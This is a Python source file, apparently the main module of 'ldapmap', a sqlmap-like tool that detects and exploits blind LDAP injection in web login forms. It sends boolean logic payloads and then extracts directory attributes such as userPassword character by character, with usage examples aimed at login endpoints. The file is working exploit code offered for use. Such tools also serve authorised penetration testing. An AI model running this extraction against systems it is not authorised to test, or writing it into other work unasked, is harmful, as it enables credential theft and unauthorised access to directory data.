#!/usr/bin/env python3
"""
ldapmap.py — Blind LDAP Injection Scanner and Extractor
========================================================
A command-line tool that automatically detects and exploits LDAP Injection
vulnerabilities using blind boolean-based techniques, similar in concept to
sqlmap for SQL injection.

Usage examples:
    # Detect injection in a POST form parameter
    python ldapmap.py -u http://target/login -d "user=admin&pass=INJECT_HERE" -p pass

    # Extract the value of the 'userPassword' attribute
    python ldapmap.py -u http://target/login -d "user=admin&pass=INJECT_HERE" \
        -p pass --extract userPassword

    # Inject into a JSON body parameter
    python ldapmap.py -u http://target/login \
        --jsondata '{"username":"admin","password":"INJECT_HERE"}' \
        -p password --extract userPassword

    # Route traffic through Burp Suite for debugging
    python ldapmap.py -u http://target/login -d "user=admin&pass=INJECT_HERE" \
        -p pass --proxy http://127.0.0.1:8080

    # Enable verbose mode to log every outgoing payload
    python ldapmap.py -u http://target/login -d "user=admin&pass=INJECT_HERE" \
        -p pass --verbose
"""

import argparse
import json
import sys
from urllib.parse import parse_qs

import requests

from ldapmap_constants import (
    CHARSET,
    COMMON_ATTRIBUTES,
    DETECTION_PAYLOADS,
    LENGTH_TOLERANCE,
    LOGIC_PAYLOADS,
    TIMEOUT,
)
from ldapmap_engine import (
    calibrate,
    classify_response,
    discover_attributes,
    extract_attribute,
    get_baseline,
    is_true_response,
)
from ldapmap_http import build_session, send_request
from ldapmap_payloads import build_payload_data


# ---------------------------------------------------------------------------
# Detection module
# ---------------------------------------------------------------------------


def detect_injection(
    session: requests.Session,
    url: str,
    base_data: dict,
    param: str,
    true_status: int,
    true_length: int,
    verbose: bool = False,
    use_json: bool = False,
    probe_attr: str = "objectClass",
    true_statuses: set[int] | None = None,
    false_statuses: set[int] | None = None,
) -> bool:
    """
    Probe the target with common LDAP meta-characters and logic payloads.

    Prints a report of which payloads caused a different response, which
    indicates that the parameter is embedded in an LDAP query without sanitization.

    *probe_attr* is the LDAP attribute used in the AND/OR logic probes (e.g.
    ``)(attr=*))(&(attr=``).  It defaults to ``objectClass`` which is present
    on every LDAP entry, but you can supply any attribute that is known to
    exist on the target entry so that the probes do not rely on ``objectClass``
    being present.

    Returns True if at least one payload produced a distinguishable response.
    """
    print("\n[*] --- Detection Phase ---")
    vulnerable = False

    # Build probes dynamically so the caller controls which attribute is used
    detection_payloads = [
        p.replace("objectClass", probe_attr) for p in DETECTION_PAYLOADS
    ]
    logic_payloads = {
        k: v.replace("objectClass", probe_attr) for k, v in LOGIC_PAYLOADS.items()
    }

    for payload in detection_payloads:
        data = build_payload_data(base_data, param, payload, use_json)
        resp = send_request(session, url, data, verbose, use_json)
        if resp is None:
            continue
        length = len(resp.content)
        status_true_set = true_statuses if true_statuses is not None else {true_status}
        classification = classify_response(resp, status_true_set, true_length, false_statuses)
        different = classification != "true"
        marker = "[!] DIFFERENT" if different else "    same     "
        print(
            f"  {marker}  payload={repr(payload):<40} "
            f"HTTP {resp.status_code}, length={length}, class={classification.upper()}"
        )
        if different:
            vulnerable = True

    # AND / OR logic probes
    print("\n[*] AND/OR logic probes:")
    for label, payload in logic_payloads.items():
        data = build_payload_data(base_data, param, payload, use_json)
        resp = send_request(session, url, data, verbose, use_json)
        if resp is None:
            continue
        status_true_set = true_statuses if true_statuses is not None else {true_status}
        classification = classify_response(resp, status_true_set, true_length, false_statuses)
        looks_true = classification == "true"
        print(
            f"  [{label}] payload={repr(payload):<50} "
            f"→ {classification.upper()}"
        )
        if looks_true:
            vulnerable = True

    return vulnerable


# ---------------------------------------------------------------------------
# CLI argument parsing
# ---------------------------------------------------------------------------


def parse_args() -> argparse.Namespace:
    """Define and parse command-line arguments."""
    parser = argparse.ArgumentParser(
        prog="ldapmap",
        description=(
            "Blind LDAP Injection Scanner and Extractor.\n"
            "Detect and exploit LDAP injection vulnerabilities automatically."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "-u", "--url",
        required=True,
        metavar="URL",
        help="Target URL (e.g., http://target/login)",
    )
    data_group = parser.add_mutually_exclusive_group(required=True)
    data_group.add_argument(
        "-d", "--data",
        metavar="DATA",
        help='POST form data, e.g. "username=admin&password=INJECT_HERE"',
    )
    data_group.add_argument(
        "--jsondata",
        metavar="JSON",
        help=(
            'POST JSON body, e.g. \'{"username":"admin","password":"INJECT_HERE"}\'. '
            "Sends Content-Type: application/json. "
            "Use --param to specify which top-level key to inject into."
        ),
    )
    parser.add_argument(
        "-p", "--param",
        required=True,
        metavar="PARAM",
        help="Name of the parameter to inject into (e.g., password)",
    )
    parser.add_argument(
        "--proxy",
        metavar="PROXY",
        default=None,
        help="Optional HTTP proxy URL (e.g., http://127.0.0.1:8080)",
    )
    parser.add_argument(
        "--extract",
        metavar="ATTRIBUTE",
        default=None,
        help=(
            "LDAP attribute whose value should be extracted "
            "(e.g., userPassword). If omitted, attribute discovery is run."
        ),
    )
    parser.add_argument(
        "--attributes",
        metavar="ATTR",
        action="append",
        default=None,
        dest="attributes",
        help=(
            "Additional LDAP attribute to include in discovery "
            "(can be repeated, e.g. --attributes uid --attributes cn). "
            "The first supplied attribute is also used as the probe attribute "
            "in injection detection instead of the default 'objectClass', so "
            "the tool does not need objectClass to be present on the entry."
        ),
    )
    parser.add_argument(
        "--exclude-value",
        metavar="VALUE",
        default=None,
        help=(
            "Value to skip while extracting. Useful when you already know one "
            "value and want to continue searching for others."
        ),
    )
    parser.add_argument(
        "--find-all",
        action="store_true",
        default=False,
        help=(
            "Search for all possible values of the extracted attribute instead "
            "of stopping at the first one."
        ),
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        default=False,
        help="Print every outgoing POST payload to stdout.",
    )
    parser.add_argument(
        "--true-status",
        metavar="CODE",
        action="append",
        type=int,
        default=None,
        dest="true_statuses",
        help=(
            "HTTP status code to classify as TRUE (repeatable). "
            "If omitted, the calibrated baseline TRUE status is used."
        ),
    )
    parser.add_argument(
        "--false-status",
        metavar="CODE",
        action="append",
        type=int,
        default=None,
        dest="false_statuses",
        help=(
            "HTTP status code to classify as FALSE (repeatable). "
            "Codes outside TRUE/FALSE sets are classified as ERROR."
        ),
    )
    return parser.parse_args()


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------


def main() -> None:
    """Main orchestration function."""
    args = parse_args()

    if args.jsondata is not None:
        # Parse JSON body into a dict
        try:
            base_data = json.loads(args.jsondata)
        except json.JSONDecodeError as exc:
            print(f"[!] Invalid JSON in --jsondata: {exc}", file=sys.stderr)
            sys.exit(1)
        if not isinstance(base_data, dict):
            print("[!] --jsondata must be a JSON object (key/value pairs).", file=sys.stderr)
            sys.exit(1)
        use_json = True
    else:
        # Parse form data string into a dict (parse_qs returns lists; flatten them)
        parsed = parse_qs(args.data, keep_blank_values=True)
        base_data = {k: v[0] for k, v in parsed.items()}
        use_json = False

    if args.param not in base_data:
        data_flag = "--jsondata" if use_json else "--data"
        print(
            f"[!] Parameter '{args.param}' not found in {data_flag}. "
            "Check spelling and try again.",
            file=sys.stderr,
        )
        sys.exit(1)

    print(f"[*] Target  : {args.url}")
    print(f"[*] Param   : {args.param}")
    print(f"[*] Mode    : {'JSON body' if use_json else 'form data'}")
    if args.proxy:
        print(f"[*] Proxy   : {args.proxy}")
    if args.verbose:
        print("[*] Verbose : enabled")

    # Build the attribute list and choose a probe attribute for detection.
    # Extra attributes are prepended so they appear first in discovery output
    # and the first one is used as the probe attribute in logic probes (so the
    # tool does not rely on objectClass being present when the caller knows
    # which attributes actually exist on the target entries).
    extra_attrs: list[str] = args.attributes or []
    if extra_attrs:
        # Deduplicate while preserving order (extra attrs first)
        all_attrs = list(dict.fromkeys(extra_attrs + COMMON_ATTRIBUTES))
        probe_attr = extra_attrs[0]
        print(f"[*] Extra attributes: {', '.join(extra_attrs)}")
        print(f"[*] Probe attribute : {probe_attr}")
    else:
        all_attrs = COMMON_ATTRIBUTES
        probe_attr = "objectClass"

    session = build_session(args.proxy)

    # 1. Baseline
    true_status, true_length = get_baseline(session, args.url, base_data, args.verbose, use_json)

    # 2. Calibrate TRUE fingerprint
    true_status, true_length = calibrate(
        session, args.url, base_data, args.param, true_status, true_length, args.verbose, use_json
    )
    true_statuses = set(args.true_statuses) if args.true_statuses else {true_status}
    false_statuses = set(args.false_statuses) if args.false_statuses else set()
    overlap = true_statuses & false_statuses
    if overlap:
        false_statuses -= overlap
        print(
            f"[!] Ignoring overlapping FALSE statuses that are also TRUE: {sorted(overlap)}",
            file=sys.stderr,
        )

    # 3. Detection
    vulnerable = detect_injection(
        session, args.url, base_data, args.param, true_status, true_length, args.verbose, use_json,
        probe_attr,
        true_statuses=true_statuses,
        false_statuses=false_statuses,
    )

    if not vulnerable:
        print(
            "\n[*] No distinguishable differences detected. "
            "The parameter may not be injectable, or the responses are indistinguishable."
        )
    else:
        print("\n[+] Parameter appears to be injectable!")

    # 4. Attribute discovery or extraction
    if args.extract:
        value = extract_attribute(
            session, args.url, base_data, args.param,
            args.extract, true_status, true_length, args.verbose, use_json,
            true_statuses=true_statuses, false_statuses=false_statuses,
            exclude_value=args.exclude_value, find_all=args.find_all,
        )
        if isinstance(value, list):
            if value:
                print(f"\n[+] Extracted {args.extract} values: {', '.join(value)}")
            else:
                print(f"\n[-] Could not extract value for attribute '{args.extract}'.")
        elif value:
            print(f"\n[+] Extracted {args.extract} = {value}")
        else:
            print(f"\n[-] Could not extract value for attribute '{args.extract}'.")
    else:
        attrs = discover_attributes(
            session, args.url, base_data, args.param, true_status, true_length, args.verbose, use_json,
            all_attrs,
            true_statuses=true_statuses, false_statuses=false_statuses,
        )
        if attrs:
            print(f"\n[+] Discovered attributes: {', '.join(attrs)}")
            print("[*] Re-run with --extract <attribute> to retrieve the full value.")
        else:
            print("\n[-] No common attributes discovered.")


if __name__ == "__main__":
    main()
